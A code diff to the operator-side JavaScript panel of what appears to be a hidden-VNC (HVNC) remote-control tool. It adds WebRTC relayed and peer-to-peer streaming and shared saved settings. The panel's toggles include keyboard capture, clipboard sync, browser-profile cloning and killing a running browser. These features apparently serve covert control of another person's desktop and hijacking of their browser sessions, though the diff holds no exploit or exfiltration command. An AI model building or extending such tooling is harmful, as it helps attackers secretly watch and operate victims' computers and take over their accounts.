@@ -1,6 +1,9 @@
 import { encodeMsgpack, decodeMsgpack } from "./msgpack-helpers.js";
 import { checkFeatureAccess } from "./feature-gate.js";
 import { createKeyboardCapture } from "./keyboard-capture.js";
+import { WhepClient } from "./whep.js";
+import { P2PClient } from "./webrtc-p2p.js";
+import { createSharedUiSettingsSaver, loadSharedUiSettings } from "./shared-ui-settings.js";
 
 (async function () {
   const clientId = new URLSearchParams(location.search).get("clientId");
@@ -65,6 +68,8 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   const qualityValue = document.getElementById("qualityValue");
   const codecH264 = document.getElementById("codecH264");
   const codecMode = document.getElementById("codecMode");
+  const webrtcMode = document.getElementById("webrtcMode");
+  const webrtcVideo = document.getElementById("webrtcVideo");
   const canvas = document.getElementById("frameCanvas");
   const canvasContainer = document.getElementById("canvasContainer");
   const contextMenu = document.getElementById("hvncContextMenu");
@@ -76,6 +81,13 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   const dxgiCtrl = document.getElementById("dxgiCtrl");
   const uiaCtrl = document.getElementById("uiaCtrl");
   const hvncResolutionSelect = document.getElementById("hvncResolutionSelect");
+  let whepClient = null;
+  let p2pClient = null;
+  let webrtcActive = false;
+
+  function getWebrtcMode() {
+    return webrtcMode ? String(webrtcMode.value || "off") : "off";
+  }
 
   function syncInputEnableState() {
     if (mouseCtrl) sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
@@ -96,7 +108,6 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   let moveTimer = null;
   let videoDecoder = null;
   let h264TimestampUs = 0;
-  const codecPrefKey = "hvncCodecPreferH264";
   let prefersH264 = typeof VideoDecoder === "function";
   let lastMoveSentAt = 0;
   const mouseMoveIntervalMs = 33;
@@ -108,12 +119,68 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   let lastClipboardText = "";
   let clipboardSyncActive = false;
 
-  const storedCodecPref = localStorage.getItem(codecPrefKey);
-  if (storedCodecPref === "0") {
-    prefersH264 = false;
-  } else if (storedCodecPref === "1") {
-    prefersH264 = typeof VideoDecoder === "function";
+  let savedDisplay = null;
+
+  function setSelectValue(select, value) {
+    if (!select || value === undefined || value === null) return false;
+    const normalized = String(value);
+    const exists = Array.from(select.options || []).some((opt) => opt.value === normalized);
+    if (!exists) return false;
+    select.value = normalized;
+    return true;
   }
+
+  function applySavedDisplay() {
+    if (savedDisplay === null || savedDisplay === undefined) return;
+    setSelectValue(displaySelect, savedDisplay);
+  }
+
+  function applySharedSettings(settings) {
+    if (!settings || typeof settings !== "object") return;
+    savedDisplay = Number.isFinite(Number(settings.display)) ? Number(settings.display) : savedDisplay;
+    setSelectValue(hvncResolutionSelect, settings.resolution);
+    setSelectValue(webrtcMode, settings.webrtcMode);
+    if (qualitySlider && settings.quality !== undefined) qualitySlider.value = String(settings.quality);
+    if (mouseCtrl && typeof settings.mouse === "boolean") mouseCtrl.checked = settings.mouse;
+    if (kbdCtrl && typeof settings.keyboard === "boolean") kbdCtrl.checked = settings.keyboard;
+    if (clipboardSyncCtrl && typeof settings.clipboardSync === "boolean") clipboardSyncCtrl.checked = settings.clipboardSync;
+    if (dxgiCtrl && typeof settings.dxgi === "boolean") dxgiCtrl.checked = settings.dxgi;
+    if (uiaCtrl && typeof settings.uia === "boolean") uiaCtrl.checked = settings.uia;
+    if (typeof settings.preferH264 === "boolean") {
+      prefersH264 = settings.preferH264 && typeof VideoDecoder === "function";
+    }
+    const cloneToggle = document.getElementById("hvncCloneToggle");
+    const cloneLiteToggle = document.getElementById("hvncCloneLiteToggle");
+    const killIfRunningToggle = document.getElementById("hvncKillIfRunningToggle");
+    if (cloneToggle && typeof settings.cloneProfile === "boolean") cloneToggle.checked = settings.cloneProfile;
+    if (cloneLiteToggle && typeof settings.cloneLite === "boolean") cloneLiteToggle.checked = settings.cloneLite;
+    if (killIfRunningToggle && typeof settings.killIfRunning === "boolean") {
+      killIfRunningToggle.checked = settings.killIfRunning;
+    }
+    applySavedDisplay();
+  }
+
+  function readSharedSettings() {
+    return {
+      display: Number(displaySelect?.value || 0),
+      resolution: hvncResolutionSelect?.value || "1080",
+      quality: Number(qualitySlider?.value || 90),
+      preferH264: !!prefersH264,
+      webrtcMode: getWebrtcMode(),
+      mouse: !!mouseCtrl?.checked,
+      keyboard: !!kbdCtrl?.checked,
+      clipboardSync: !!clipboardSyncCtrl?.checked,
+      dxgi: !!dxgiCtrl?.checked,
+      uia: !!uiaCtrl?.checked,
+      cloneProfile: document.getElementById("hvncCloneToggle")?.checked !== false,
+      cloneLite: document.getElementById("hvncCloneLiteToggle")?.checked === true,
+      killIfRunning: document.getElementById("hvncKillIfRunningToggle")?.checked === true,
+    };
+  }
+
+  applySharedSettings(await loadSharedUiSettings("hvnc"));
+  const sharedSettingsSaver = createSharedUiSettingsSaver("hvnc", readSharedSettings);
+
   if (codecH264) {
     codecH264.checked = prefersH264;
     codecH264.disabled = typeof VideoDecoder !== "function";
@@ -253,7 +320,10 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   }
 
   if (clipboardSyncCtrl) {
-    clipboardSyncCtrl.addEventListener("change", checkClipboardSync);
+    clipboardSyncCtrl.addEventListener("change", function () {
+      checkClipboardSync();
+      sharedSettingsSaver.scheduleSave();
+    });
   }
 
   function clearOfflineTimer() {
@@ -290,6 +360,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       clearOfflineTimer();
       if (desiredStreaming) {
         setStreamState("starting", "Reconnecting");
+        const mode = getWebrtcMode();
         if (displaySelect && displaySelect.value !== undefined) {
           sendCmd("hvnc_select_display", {
             display: parseInt(displaySelect.value, 10) || 0,
@@ -297,7 +368,9 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
         }
         sendCmd("hvnc_start", {
           autoStartExplorer: false,
+          webrtc: mode === "relayed",
         });
+        if (mode === "p2p") startP2P();
         syncInputEnableState();
       } else {
         setStreamState("idle", "Stopped");
@@ -672,6 +745,110 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     ws.send(encodeMsgpack(msg));
   }
 
+  function setWebrtcViewActive(active) {
+    webrtcActive = !!active;
+    if (canvas) canvas.style.display = active ? "none" : "block";
+    if (webrtcVideo) webrtcVideo.style.display = active ? "block" : "none";
+  }
+
+  function onWebrtcState(label, state) {
+    console.debug(`hvnc webrtc[${label}]: state`, state);
+    if (state === "connected") {
+      setStreamState("streaming", `Streaming (${label})`);
+    } else if (state === "failed" || state === "disconnected") {
+      setWebrtcViewActive(false);
+    }
+  }
+
+  let webrtcRvfcHandle = 0;
+  let webrtcFpsCount = 0;
+  let webrtcFpsWindowStart = 0;
+
+  function startWebrtcFrameTicker() {
+    if (!webrtcVideo || typeof webrtcVideo.requestVideoFrameCallback !== "function") return;
+    stopWebrtcFrameTicker();
+    webrtcFpsCount = 0;
+    webrtcFpsWindowStart = performance.now();
+    const tick = (now) => {
+      lastFrameAt = performance.now();
+      clearOfflineTimer();
+      webrtcFpsCount += 1;
+      const elapsed = now - webrtcFpsWindowStart;
+      if (elapsed >= 1000) {
+        const fps = Math.round((webrtcFpsCount * 1000) / elapsed);
+        updateFpsDisplay(fps);
+        webrtcFpsCount = 0;
+        webrtcFpsWindowStart = now;
+      } else {
+        updateFpsDisplay();
+      }
+      webrtcRvfcHandle = webrtcVideo.requestVideoFrameCallback(tick);
+    };
+    webrtcRvfcHandle = webrtcVideo.requestVideoFrameCallback(tick);
+  }
+
+  function stopWebrtcFrameTicker() {
+    if (webrtcRvfcHandle && webrtcVideo && typeof webrtcVideo.cancelVideoFrameCallback === "function") {
+      webrtcVideo.cancelVideoFrameCallback(webrtcRvfcHandle);
+    }
+    webrtcRvfcHandle = 0;
+  }
+
+  async function startWhep(whepPath) {
+    await stopAllWebrtc();
+    if (!webrtcVideo) return;
+    whepClient = new WhepClient({
+      whepPath,
+      videoEl: webrtcVideo,
+      onState: (state) => onWebrtcState("WebRTC Relayed", state),
+    });
+    try {
+      await whepClient.start();
+      setWebrtcViewActive(true);
+      startWebrtcFrameTicker();
+    } catch (err) {
+      console.warn("hvnc webrtc: WHEP start failed, falling back to canvas", err);
+      setWebrtcViewActive(false);
+      whepClient = null;
+    }
+  }
+
+  async function startP2P() {
+    await stopAllWebrtc();
+    if (!webrtcVideo) return;
+    p2pClient = new P2PClient({
+      videoEl: webrtcVideo,
+      send: (msg) => {
+        if (ws && ws.readyState === WebSocket.OPEN) {
+          ws.send(encodeMsgpack(msg));
+        }
+      },
+      onState: (state) => onWebrtcState("WebRTC P2P", state),
+    });
+    try {
+      await p2pClient.start();
+      setWebrtcViewActive(true);
+      startWebrtcFrameTicker();
+    } catch (err) {
+      console.warn("hvnc webrtc: P2P start failed, falling back to canvas", err);
+      setWebrtcViewActive(false);
+      const client = p2pClient;
+      p2pClient = null;
+      if (client) { try { await client.stop(); } catch {} }
+    }
+  }
+
+  async function stopAllWebrtc() {
+    stopWebrtcFrameTicker();
+    setWebrtcViewActive(false);
+    const whep = whepClient;
+    whepClient = null;
+    if (whep) { try { await whep.stop(); } catch {} }
+    const p2p = p2pClient;
+    p2pClient = null;
+    if (p2p) { try { await p2p.stop(); } catch {} }
+  }
+
   let monitors = 1;
 
   function populateDisplays(count) {
@@ -687,6 +864,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     if (displaySelect.options.length) {
       displaySelect.value = displaySelect.options[0].value;
     }
+    applySavedDisplay();
   }
 
   async function fetchClientInfo() {
@@ -699,6 +877,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       }
       if (client && client.monitors) {
         populateDisplays(client.monitors);
+        applySavedDisplay();
       }
     } catch (e) {
       console.warn("failed to fetch client info", e);
@@ -721,16 +900,28 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     sendCmd("hvnc_set_quality", { quality: q, codec });
   }
 
+  function pushTransportQuality(mode) {
+    if (mode === "relayed" || mode === "p2p") {
+      const q = Number(qualitySlider?.value) || 90;
+      setCodecModeLabel("h264", "webrtc");
+      sendCmd("hvnc_set_quality", { quality: q, codec: "h264", source: "webrtc" });
+      return;
+    }
+    if (qualitySlider) {
+      pushQuality(qualitySlider.value);
+    }
+  }
+
   if (codecH264) {
     codecH264.addEventListener("change", function () {
       prefersH264 = !!codecH264.checked && typeof VideoDecoder === "function";
-      localStorage.setItem(codecPrefKey, prefersH264 ? "1" : "0");
       if (!prefersH264) {
         destroyVideoDecoder();
       }
       if (qualitySlider) {
         pushQuality(qualitySlider.value);
       }
+      sharedSettingsSaver.scheduleSave();
     });
   }
 
@@ -769,7 +960,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
         }
       }, 5000);
     } else if (h264ErrorCount > 3) {
-      localStorage.setItem(codecPrefKey, "0");
+      sharedSettingsSaver.scheduleSave();
     }
   }
 
@@ -834,29 +1025,39 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     sendCmd("hvnc_select_display", {
       display: parseInt(displaySelect.value, 10),
     });
+    sharedSettingsSaver.scheduleSave();
   });
 
+  if (webrtcMode) {
+    webrtcMode.addEventListener("change", function () {
+      updateControls();
+      sharedSettingsSaver.scheduleSave();
+    });
+  }
+
   startBtn.addEventListener("click", function () {
+    const mode = getWebrtcMode();
     if (displaySelect && displaySelect.value !== undefined) {
       sendCmd("hvnc_select_display", {
         display: parseInt(displaySelect.value, 10) || 0,
       });
     }
-    if (qualitySlider) {
-      pushQuality(qualitySlider.value);
-    }
+    pushTransportQuality(mode);
     desiredStreaming = true;
     lastFrameAt = 0;
     setStreamState("starting", "Starting stream");
     sendCmd("hvnc_start", {
       autoStartExplorer: false,
+      webrtc: mode === "relayed",
     });
+    if (mode === "p2p") startP2P();
     syncInputEnableState();
   });
   stopBtn.addEventListener("click", function () {
     desiredStreaming = false;
     setStreamState("stopping", "Stopping stream");
     sendCmd("hvnc_stop", {});
+    stopAllWebrtc();
   });
   if (killAllBtn) {
     killAllBtn.addEventListener("click", function () {
@@ -874,18 +1075,22 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   });
   mouseCtrl.addEventListener("change", function () {
     sendCmd("hvnc_enable_mouse", { enabled: mouseCtrl.checked });
+    sharedSettingsSaver.scheduleSave();
   });
   kbdCtrl.addEventListener("change", function () {
     sendCmd("hvnc_enable_keyboard", { enabled: kbdCtrl.checked });
+    sharedSettingsSaver.scheduleSave();
   });
   if (dxgiCtrl) {
     dxgiCtrl.addEventListener("change", function () {
       sendCmd("hvnc_enable_dxgi", { enabled: dxgiCtrl.checked });
+      sharedSettingsSaver.scheduleSave();
     });
   }
   if (uiaCtrl) {
     uiaCtrl.addEventListener("change", function () {
       sendCmd("hvnc_enable_uia", { enabled: uiaCtrl.checked });
+      sharedSettingsSaver.scheduleSave();
     });
   }
 
@@ -898,6 +1103,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   if (hvncResolutionSelect) {
     hvncResolutionSelect.addEventListener("change", function () {
       pushHvncResolution();
+      sharedSettingsSaver.scheduleSave();
     });
   }
 
@@ -906,6 +1112,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
     qualitySlider.addEventListener("input", function () {
       updateQualityLabel(qualitySlider.value);
       pushQuality(qualitySlider.value);
+      sharedSettingsSaver.scheduleSave();
     });
   }
 
@@ -1036,6 +1243,18 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
         handleStatus(msg);
         return;
       }
+      if (msg && msg.type === "webrtc_ready" && typeof msg.whepPath === "string") {
+        startWhep(msg.whepPath);
+        return;
+      }
+      if (msg && msg.type === "webrtc_p2p_answer" && typeof msg.sdp === "string") {
+        if (p2pClient) p2pClient.onAnswer(msg.sdp);
+        return;
+      }
+      if (msg && msg.type === "webrtc_p2p_ice") {
+        if (p2pClient) p2pClient.onRemoteCandidate(msg);
+        return;
+      }
       if (msg && msg.type === "hvnc_clone_progress") {
         handleCloneProgress(msg);
         return;
@@ -1083,6 +1302,18 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       handleStatus(msg);
       return;
     }
+    if (msg && msg.type === "webrtc_ready" && typeof msg.whepPath === "string") {
+      startWhep(msg.whepPath);
+      return;
+    }
+    if (msg && msg.type === "webrtc_p2p_answer" && typeof msg.sdp === "string") {
+      if (p2pClient) p2pClient.onAnswer(msg.sdp);
+      return;
+    }
+    if (msg && msg.type === "webrtc_p2p_ice") {
+      if (p2pClient) p2pClient.onRemoteCandidate(msg);
+      return;
+    }
     if (msg && msg.type === "hvnc_clone_progress") {
       handleCloneProgress(msg);
       return;
@@ -1122,16 +1353,16 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
 
   function onWsOpen() {
     reconnectDelay = 1000;
-    if (qualitySlider) {
-      pushQuality(qualitySlider.value);
-    }
+    pushTransportQuality(desiredStreaming ? getWebrtcMode() : "off");
     clearOfflineTimer();
     if (desiredStreaming) {
       setStreamState("starting", "Resuming stream");
+      const mode = getWebrtcMode();
       if (displaySelect && displaySelect.value !== undefined) {
         sendCmd("hvnc_select_display", { display: parseInt(displaySelect.value, 10) || 0 });
       }
-      sendCmd("hvnc_start", { autoStartExplorer: false });
+      sendCmd("hvnc_start", { autoStartExplorer: false, webrtc: mode === "relayed" });
+      if (mode === "p2p") startP2P();
       syncInputEnableState();
     } else {
       setStreamState("idle", "Stopped");
@@ -1149,6 +1380,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
 
   function onWsClose() {
     destroyVideoDecoder();
+    stopAllWebrtc();
     if (desiredStreaming) {
       setStreamState("connecting", "Reconnecting");
       scheduleReconnect();
@@ -1159,6 +1391,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
 
   function onWsError() {
     destroyVideoDecoder();
+    stopAllWebrtc();
     setStreamState("error", "WebSocket error");
   }
 
@@ -1270,6 +1503,7 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       if (kbdCtrl.checked) kbdCapture.enable();
       else kbdCapture.disable();
     });
+    if (kbdCtrl.checked) kbdCapture.enable();
   }
   document.addEventListener("fullscreenchange", function () {
     if (document.fullscreenElement === canvasContainer && kbdCtrl && !kbdCtrl.checked) {
@@ -1279,11 +1513,13 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
   });
 
   function stopOnExit() {
+    sharedSettingsSaver.saveNow();
     if (ws && ws.readyState === WebSocket.OPEN && desiredStreaming) {
       desiredStreaming = false;
       sendCmd("hvnc_stop", {});
     }
     destroyVideoDecoder();
+    stopAllWebrtc();
   }
 
   window.addEventListener("beforeunload", stopOnExit);
@@ -1319,6 +1555,15 @@ import { createKeyboardCapture } from "./keyboard-capture.js";
       showContextMenuAt(rect.left, rect.bottom + 6);
     });
   }
+
+  ["hvncCloneToggle", "hvncCloneLiteToggle", "hvncKillIfRunningToggle"].forEach((id) => {
+    const el = document.getElementById(id);
+    if (el) {
+      el.addEventListener("change", function () {
+        sharedSettingsSaver.scheduleSave();
+      });
+    }
+  });
 
   if (contextMenu) {
     contextMenu.querySelectorAll("[data-action]").forEach((item) => {
